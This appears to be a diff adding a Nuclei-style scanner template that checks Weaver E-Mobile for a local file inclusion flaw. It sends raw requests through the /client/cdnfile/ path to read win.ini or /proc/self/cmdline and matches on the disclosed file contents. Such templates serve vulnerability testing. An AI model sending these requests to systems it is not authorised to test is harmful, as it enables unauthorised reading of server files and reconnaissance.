@@ -1,0 +1,25 @@
+
+id: weaver-EMobile-lfi
+
+info:
+  name: msk-template
+  author: msk
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /client/cdnfile/1C/Windows/win.ini?windows HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /client/cdnfile/C/proc/self/cmdline?linux HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        condition: or
+        dsl:
+          - status_code==200 && contains_all(body,"[fon") && contains_all(all_headers,'filename=')
+          - status_code==200 && contains_all(body,"SecurityListener.UMASK") && contains_all(all_headers,'filename')
